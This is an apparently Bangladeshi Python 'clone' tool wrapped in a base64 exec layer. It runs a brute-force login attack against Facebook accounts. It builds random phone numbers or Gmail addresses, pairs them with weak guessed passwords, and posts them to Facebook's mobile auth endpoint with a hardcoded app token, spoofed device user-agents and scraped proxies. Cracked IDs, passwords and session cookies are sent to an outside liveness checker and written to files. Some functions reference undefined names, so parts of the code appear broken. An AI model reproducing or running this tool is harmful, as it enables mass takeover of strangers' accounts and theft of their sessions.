#__________________| INFO |___________________#
#______SCRIPT ENCRYPTED BY PYTHON 3.0
#______CODING BY: MEHEDI
#______TELEGRAM : https://t.me/lokmanvau
#________________| SCRIPT DATA |_____________#

import base64
exec(base64.b64decode(b'#------------------------------><Import><-----------------------------#
import os,time,random,string,re,sys,requests,json,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as tred 
#gttxs=random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268''GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-I8750','GT-I900','GT-I9008L','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9190','GT-I9192','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9300','GT-I9300I','GT-I9301I','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9500','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-M5650','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5110','GT-P5200','GT-P5210','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','SAMSUNG','LMY4','LMY47V','MMB29K','MMB29M','LRX22C','LRX22G','NMF2','NMF26X','NMF26X;','NRD90M','NRD90M;','SPH-L720','IML74K','IMM76D','JDQ39','JSS15J','JZO54K','KOT4','KOT49H','KOT4SM-T310','KTU84P','SM-A500F','SM-A500FU','SM-A500H','SM-G532F','SM-G900F','SM-G920F','SM-G930F','SM-G935','SM-G950F','SM-J320F','SM-J320FN','SM-J320H','SM-J320M','SM-J510FN','SM-J701F','SM-N920S','SM-T111','SM-T230','SM-T231','SM-T235','SM-T280','SM-T311','SM-T315','SM-T525','SM-T531','SM-T535','SM-T555','SM-T561','SM-T705','SM-T805','SM-T820'])
try:os.system("pkg install espeak")
except:pass
os.system("git pull")
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:pass
proxsi=open('socksku.txt','r').read().splitlines()
#------------------------------><Colour><-----------------------------#
ch="\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mCHOOSE    \033[1;97m➤\033[1;32m  ";B = '\x1b[1;90m';R = '\x1b[1;91m';G = '\x1b[1;92m';H = '\x1b[1;93m';BL = '\x1b[1;94m';BG = '\x1b[1;95m';S = '\x1b[1;96m';W = '\x1b[1;97m';EX = '\x1b[0m';E = '\33[m'
#------------------------------><Model><-----------------------------#
(loop,lop,oks,cps,ugen,ugtn,ugxn,id,ok,cp,twf,xode,plist,cpx,cokix,apkx,paswtrh,rcd,rcdx,user)=(0,0,[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[],[])
pwpluss,pwnya,dump,id,id2,tokenku,method,loop,oks,cps=[],[],[],[],[],[],[],0,0,0
rc = random.choice;rr = random.randint
ugen =[];user=[]
#------------------------------><Linex><-----------------------------#
def linex():print("\x1b[38;5;196m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#--------------------------------><Line<-------------------------------#
def line():print("\n\x1b[38;5;196m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#------------------------------><Clear><-----------------------------#
def clear():os.system("clear");print(logo)
#------------------------------><uadef><-----------------------------#
def kkkkk():
	Relmi = random.choice(['CPH2285','CPH2213','CPH1969','CPH2209','CPH1987','CPH1451','CPH2687','PHY110','CPH2667','CPH2641','CPH2663','OPD2301','CPH2643','CPH2331','CPH8363','CPH8347','CPH8346','CPH7948','CPH7577','CPH7532','CPH7382','CPH7364','CPH7338','CPH6697','CPH6528','CPH7364','CPH6519','CPH6528','CPH6697','CPH7338','CPH6178','CPH6244','CPH6271','CPH6316'])
	build = random.choice(['UP1A','SP1A','UKQ1','OPM1','RP1A'])
	width = random.choice(['720','1080', '1440','1280','1426','2345','2351','2434'])    
	dens = random.choice(['2.0','2.5','3.0','4.0','1.5', '2.625', '1.75', '3.5','1.0','1.1','1.9125','1.7']) 
	bilt = f'''{build}.{random.randint(111111, 999999)}.{random.randint(111, 999)}'''
	fb_version = f'''{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}'''
	bal = random.choice(['en_US','en_GB'])
	pkg = random.choice(['1096','1280','2224','1800','1358', '1400','1406','1436','2132','1456','1920','2176'])
	fb = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
	mobile_version = f'''{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}'''
	#ua = 'Dalvik/2.1.0 (Linux; U; Android ' + str(random.randint(4, 13)) + '; ' + str(Relmi) + ' Build/' + str(bilt) + ') [FBAN/Orca-Android;FBAV/' + str(fb_version) + ';FBPN/' + str(fb) + ';FBLC/' + str(bal) + ';FBBV/' + str(random.randint(10000000, 66666666)) + ';FBCR/' + str(random.choice(['Robi','airtel','Airtel','Grameenphone','Telenor','movistar','TELCEL','Jio 4G','Vodafone IN','Banglalink','VIVO','Claro BR'])) + ';FBMF/Realme;FBBD/realme;FBDV/' + str(Relmi) + ';FBSV/' + str(mobile_version) + ';FBCA/arm64-v8a:null;FBDM/{density=' + str(dens) + ',width=' + str(width) + ',height=' + str(pkg) + '};FB_FW/1;]'
	ua = 'Dalvik/2.1.0 (Linux; U; Android ' + str(random.randint(4, 13)) + ';' + str(Relmi) + ' Build/' + str(bilt) + ')[FBAN/Orca- Android;FBAV/' + str(fb_version) + ';FBPN/' + str(fb) + ';FBLC/' + str(bal) + ';FBBV/' + str(random.randint(10000000, 66666666)) + ';FBCR/' + str(random.choice(['Robi','airtel','Airtel','Grameenphone','Telenor','movistar','TELCEL','Jio 4G','Vodafone IN','Banglalink','VIVO','Claro BR'])) + ';FBMF/OPPO;FBBD/OPPO;FBDV/' + str(Relmi) + ';FBSV/' + str(mobile_version) + ';FBCA/armeabi-v7a:armeabi;FBDM/{density=' + str(dens) + ',width=' + str(width) + ',height=' + str(pkg) + '};FB_FW/1;]'
	return ua
	

def __SEX__():
	bal = "[FBAN/Orca- Android;FBAV/275.0.0.20.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/234764319;FBCR/Robi;FBMF/OPPO;FBDV/CPH1803;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
	ua = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + bal
	return ua

#-----------------------------><Banner><---------------------------#
logo = """
      \033[1;32m888888 88b 88  dP""b8 88""Yb Yb  dP 
      \033[1;32m88__   88Yb88 dP   `" 88__dP  YbdP  
      \033[1;32m88""   88 Y88 Yb  "88 88"Yb    8P   
      \033[1;32m888888 88  Y8  YboodP 88  Yb  dP  V\x1b[38;5;196m/\033[1;32m5
\x1b[38;5;196m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mDEVLOPER  \033[1;97m➤\033[1;32m  MD ASIF HASAN 
\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mPARTNER   \033[1;97m➤\033[1;32m  MEHEDI\033[1;97mx\033[1;32mFARABI\033[1;97mx\033[1;32mARFAN
\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mGITHUB    \033[1;97m➤\033[1;32m  ENGRY-143
\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mTOOLTYPE \033[1;97m ➤\033[1;32m  RANDOM\033[1;97mx\033[1;32mGMAIL\033[1;97mx\033[1;32mCONE
\x1b[38;5;196m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

def Menuix():
	clear()
	print(f'\x1b[38;5;196m[\033[1;32mA\x1b[38;5;196m] \033[1;32mGMAIL CLONE ')
	print(f'\x1b[38;5;196m[\033[1;32mB\x1b[38;5;196m] \033[1;32mRANDOM CLONE')
	print(f'\x1b[38;5;196m[\033[1;32mC\x1b[38;5;196m] \033[1;32mCONTACT ADMIN')
	print(f'\x1b[38;5;196m[\033[1;32mD\x1b[38;5;196m] \033[1;32mEXIT PROGRAMME')
	linex()
	fuck = input(''+ch+'')
	if fuck in ('1','A','01'):___gamilx___()
	elif fuck in ('2','02','B'):Random()
	elif fuck in ('3','03','C'):exit()
	elif fuck in ('4'):exit()
	
	


def ___gamilx___():
	ids=[]
	clear();print('\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mEXAMPLE   \033[1;97m➤\033[1;32m  sadiya sakib jannat rabbi rakib ');linex();first = input(f'{ch}');clear();print('\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mEXAMPLE   \033[1;97m➤\033[1;32m  akter hasan islam ahmed ');linex();last = input(f'{ch}');clear();print('\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mEXAMPLE   \033[1;97m➤\033[1;32m  5000 7000 9000 11000 12345');linex();limit = int(input(f'{ch}'))
	domain = '@gmail.com'
	for nmbr in range(limit):nmp = ''.join(random.choice(string.digits) for _ in range(3));ids.append(nmp)
	with tred(max_workers=30) as __sex__:
		clear();tk = first+last;idx = str(len(ids))
		print('\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mTOTAL LIMIT \033[1;97m➤\033[1;32m '+str(limit)+'');print('\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mDOMIEN \033[1;97m➤\033[1;32m '+str(first)+''+str(last)+''+str(domain)+'');print('\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mAIRPLNE MODE \x1b[38;5;196m[\033[1;32mON\033[1;97m/\x1b[38;5;208mOFF\x1b[38;5;196m]\033[1;32m AFTER EVERY 2 MINUTES ');linex()
		for number in ids:
			ids = first+'.'+last+number+domain
			pasx = [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12',first+last+'123'] 
			__sex__.submit(__M__,ids,pasx)
	line()
	print('\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mYOUR CRACKING HAS BEEN COMPLETED ')
	linex()
	input(f'\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32m AGIN MY TOOLS RAN MY USER...')
		
	
def __M__(ids,pasx):
        global loop,oks,cps
      #  sys.stdout.write(f'\r\r\r\r\r\r\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m]\033[1;97m-\x1b[38;5;196m[\033[1;32mENGRY-G1\x1b[38;5;196m]\033[1;97m-\x1b[38;5;196m[\033[1;32m{loop}\x1b[38;5;196m]\033[1;97m-\x1b[38;5;196m[\033[1;32m{oks}|{cps} ');sys.stdout.flush()
        sys.stdout.write(f'\r\r\r\r\r\r\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m]\033[1;97m-\x1b[38;5;196m[\033[1;32mENGRY-G1\x1b[38;5;196m]\033[1;97m-\x1b[38;5;196m[\033[1;32m{loop}\x1b[38;5;196m]\033[1;97m-\x1b[38;5;196m[\033[1;32m{oks}\x1b[38;5;196m]\033[1;97m ');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': __SEX__(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                cookie = f"sb={ssbb};{coki}"
                                response = str(requests.get(f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={uid}").text)
                                if "LIVE" in response:
                                	print(f'\r\r\r\r\r\r\x1b[38;5;196m[\033[1;32mENGRY-💚\x1b[38;5;196m] \033[1;32m{str(uid)}\033[1;97m | \033[1;32m{pas}')
                                	print(f'\r\r\r\r\r\r\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32m'+cookie+'')
                                	open('/sdcard/ENGRY-M2-RANDOM-OK-COKIE.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                	oks.append(str(uid))
                                	break
                                else:continue
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r\r\r\r\r\x1b[38;5;196m[\x1b[38;5;196mGMAIL-CP\x1b[38;5;196m] \x1b[38;5;196m{str(uid)}\x1b[38;5;196m | \x1b[38;5;196m{pas}')
                                open('/sdcard/ENGRY-M2-RANDOM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass

#------------------------------><Mainx><-----------------------------#
def Random():
	clear();print('\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mEXAMPLE   \033[1;97m➤\033[1;32m  017 018 019 016 013 ');linex();code=input(f'{ch}');clear();print('\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mEXAMPLE   \033[1;97m➤\033[1;32m  5000 7000 9000 11000 12345');linex();limit=int(input(f'{ch}'))
	for number in range(limit):numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
	with ThreadPool(max_workers=30) as ENGRY143:
		tid= str(len(xode))
		clear();print('\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mTOTAL LIMIT \033[1;97m➤\033[1;32m '+code+' ');print('\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mCOUNTRY SIM CODE \033[1;97m➤\033[1;32m '+tid+'\033[1;97m|\033[1;32mMETHOD \033[1;97m➤\033[1;32m BD');print('\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mAIRPLNE MODE \x1b[38;5;196m[\033[1;32mON\033[1;97m/\x1b[38;5;208mOFF\x1b[38;5;196m]\033[1;32m AFTER EVERY 2 MINUTES ');linex()
		for rngx in xode:
			id=code+rngx
			psd=[id,rngx,id[:6],id[:7],id[:8],id[5:],'jannat','sadiya','Bangla','@123456@','@@@###','bangladesh','Alamin','১২৩৪৫৬','০৯৮৭৬৫৪৩২১','০১২৩৪৫৬৭৮৯']
			ENGRY143.submit(graphrm,id,psd,tid)
	line()
	print('\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mYOUR CRACKING HAS BEEN COMPLETED ')
	print('\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32mTOTAL OK \033[1;97m➤\033[1;32m '+str(len(ok))+'')
	linex()
	input(f'\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32m AGIN MY TOOLS RAN MY USER...')
#------------------------------><Method><-----------------------------#
lk=[]
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	ua = kkkkk()
	sys.stdout.write(f'\r\r\r\r\r\r\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m]\033[1;97m-\x1b[38;5;196m[\033[1;32mENGRY-R1\x1b[38;5;196m]\033[1;97m-\x1b[38;5;196m[\033[1;32m{lop}\x1b[38;5;196m]\033[1;97m-\x1b[38;5;196m[\033[1;32m{len(ok)}\x1b[38;5;196m]\033[1;97m '),;sys.stdout.flush()
	for psw in psd:			
		vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150));VAPP = random.randint(410000000,499999999);gtt=random.choice(xxxxx);gttt=random.choice(xxxxx)		
		datax= {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': id,'password': psw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
		header={'User-Agent': kkkkkkkk(),'Accept-Encoding':  'gzip, deflate','Accept': '*/*', 'Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
		twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
		lo=requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=datax,headers=header,allow_redirects=False).json()
		if 'session_key' in lo:
			cki = lo["session_cookies"]
			ck={}
			for xk in cki:ck.update({xk["name"]:xk["value"]})
			coki = (";").join([ "%s=%s" % (key, value) for key, value in ck.items() ])
			ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
			cookie = f"sb={ssbb};{coki}"
			iid= re.findall('c_user=(.*);xs', coki)[0]			
			print(f'\r\r\r\r\r\r\x1b[38;5;196m[\033[1;32mENGRY-💚\x1b[38;5;196m] \033[1;32m'+iid+'\033[1;97m | \033[1;32m'+psw+'')
			print(f'\r\r\r\r\r\r\x1b[38;5;196m[\033[1;32m√\x1b[38;5;196m] \033[1;32m'+cookie+'');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/ENGRY-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  >>>'+coki+"\n")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			os.system('espeak -a 300 "two,f id"');open('/sdcard/ENGRY-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
		elif 'www.facebook.com' in lo['error']['message']:
			try:
				iid = lo['error']['error_data']['uid']
			except:
				iid=id
			if iid in ok:pass
			else:
				if 'y' in cpx:
					cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/ENGRY-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1			
			
		
Menuix()


#------------------------------><Linex><-----------------------------#'))